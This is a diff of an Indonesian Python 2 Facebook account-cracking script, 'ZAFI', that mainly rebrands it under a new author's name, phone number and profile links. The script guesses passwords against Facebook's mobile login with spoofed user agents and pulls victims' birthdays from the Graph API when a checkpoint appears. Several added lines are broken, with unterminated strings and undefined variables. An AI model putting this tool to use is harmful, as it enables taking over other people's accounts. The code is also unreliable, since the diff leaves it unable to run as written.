@@ -1,6 +1,6 @@
 #!/usr/bin/python2
 # coding=utf-8
-# coding by Romi Afrizal
+# coding by Bala-Bala
 # Note : jangan di ubah lagi! nanti error, script udah enak
 # Open source code team | ngotak dikit cok jangan jual di perjual belikan 
 
@@ -10,11 +10,11 @@ ingfo = (
 """%s
  • Info script :
  	
- - author      : Romi Afrizal
- - facebook    : facebook.com/romi.afrizal.102
- - fanspage    : facebook.com/100022086172556
- - whatsap     : +6282371648186
- - github      : github.com/Mark-Zuck
+ - author      : BALA-BALA
+ - facebook    : https://www.facebook.com/balaBala.henker9
+ - fanspage    : https://www.facebook.com/balaBala.henker9
+ - whatsap     : 085759162117
+ - github      : github.com/CLAOUPY4
  - script name : ZAFI (Zona Akun Facebook Indonesia)
  - version     : 1.1
  
@@ -61,7 +61,7 @@ def folder():
 	try:os.mkdir('data')
 	except:pass
 	try:
-		ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
+		ua_ = 'Mozilla/5.0 (Linux; Android 11; Infinix X6512 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.0.0.21.104;]	
 		open("data/ua.txt","w").write(ua_)
 	except:
 		pass
@@ -70,11 +70,11 @@ def folder():
 IP = requests.get("https://api.ipify.org/").text
 def banner():
 	print (''' %s 
- © Group%s \n __________       _____.__  \n \____    /____ _/ ____\__| %s> %sZona \n   /     /\\__  \\\   __\|  | %s> %sAkun \n  /     /_ / __ \|  |  |  | %s>%s Facebook [Meta] \n /_______ (____  /__|  |__| %s>%s Indonesia \n         \/    \/ \n %s[%s*%s] By : %sRomi Afrizal \n %s[%s*%s] -------------------------------------- \n [%s*%s] IP : %s%s'''%
+ © Group%s \n __________       _____.__  \n \____    /____ _/ ____\__| %s> %sZona \n   /     /\\__  \\\   __\|  | %s> %sAkun \n  /     /_ / __ \|  |  |  | %s>%s Facebook [Meta] \n /_______ (____  /__|  |__| %s>%s Indonesia \n         \/    \/ \n %s[%s*%s] By : %sCLAOUPY4 \n %s[%s*%s] -------------------------------------- \n [%s*%s] IP : %s%s'''%
  (H,K,H,K,H,K,H,K,H,K,P,K,P,H,P,K,P,K,P,H,IP))
  
 # MASUK TOKEN (TOKEN LISTRIK)
-header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
+header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "Mozilla/5.0 (Linux; Android 11; Infinix X6512 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.0.0.21.104;], "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 def masuk():
     os.system('clear');banner()
     print ('\n%s [01] Login via token \n [02] Cara mendapatkan token \n [%s00%s] Keluar'%(P,M,P))
@@ -347,7 +347,7 @@ class ngentod:
     	try:
     	    ua = open('data/ua.txt', 'r').read()
         except IOError:
-        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
+        	ua = 'Mozilla/5.0 (Linux; Android 11; Infinix X6512 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.0.0.21.104;]'
         global ok,cp,loop
         for pw in zona:
             pw = pw.lower()
@@ -402,7 +402,7 @@ class ngentod:
         try:
     	    ua = open('data/ua.txt', 'r').read()
         except IOError:
-        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
+        	ua = 'Mozilla/5.0 (Linux; Android 11; Infinix X6512 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.0.0.21.104;]'
         global ok,cp,loop
         for pw in zona:
             pw = pw.lower()
@@ -436,7 +436,7 @@ class ngentod:
             elif "checkpoint" in ses.cookies.get_dict().keys():
                 try:
                     romz = open('token.txt').read()
-                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
+                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user, CLAOUPY4)).json()['birthday']
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
                     print '\r %s*--> %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
@@ -462,7 +462,7 @@ class ngentod:
         try:
     	    ua = open('data/ua.txt', 'r').read()
         except IOError:
-        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
+        	ua = 'Mozilla/5.0 (Linux; Android 11; Infinix X6512 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.0.0.21.104;]'
         global ok,cp,loop
         for pw in zona:
             pw = pw.lower()
@@ -481,7 +481,7 @@ class ngentod:
                     else:
                     	data.update({rom.get('name'): ''})
                 else:
-                	data.update({rom.get('name'): rom.get('value')})
+                	data.update({cly.get('name'): cly.get('value')})
             data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
             '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
             ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
@@ -496,7 +496,7 @@ class ngentod:
             elif "checkpoint" in ses.cookies.get_dict().keys():
                 try:
                     romz = open('token.txt').read()
-                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
+                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,cly)).json()['birthday']
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
                     print '\r %s*--> %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
@@ -666,13 +666,13 @@ def menu():
     elif unik in['1','01']:
         publik(romz)
     elif unik in['2','02']:
-        followers(romz)
+        followers(cly)
     elif unik in['3','03']:
-        postingan(romz)
+        postingan(cly)
     elif unik in['4','04']:
     	igg()
     elif unik in['5','05']:
-        ngentod().romiy()
+        ngentod().clyy()
     elif unik in['6','06']:
     	useragent()
     elif unik in['7','07']:
